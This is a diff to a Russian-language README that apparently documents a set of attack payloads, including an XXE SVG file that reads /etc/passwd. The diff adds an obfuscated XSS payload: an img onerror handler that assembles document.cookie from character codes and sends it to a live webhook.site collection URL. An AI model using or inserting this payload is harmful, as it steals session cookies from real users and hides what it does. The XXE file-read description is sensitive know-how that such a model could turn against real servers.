@@ -97,6 +97,12 @@ Cero подключается к удалённым хостам и считыв
 
 ```
 
+```html
+<img src="x" onerror="var cookie=String.fromCharCode(100,111,99,117,109,101,110,116,46,99,111,111,107,105,101); new Image().src='https://webhook.site/ed4c7969-5419-4849-bf6d-003858a4c8a2?c=' + encodeURIComponent(eval(cookie));">
+```
+
+
+
 #### exploit.svg
 Пример SVG-файла с использованием встраивания XML External Entity (XXE). Содержит сущность, ссылающуюся на файл `/etc/passwd`, что может быть использовано для демонстрации или тестирования XXE-уязвимостей.
 
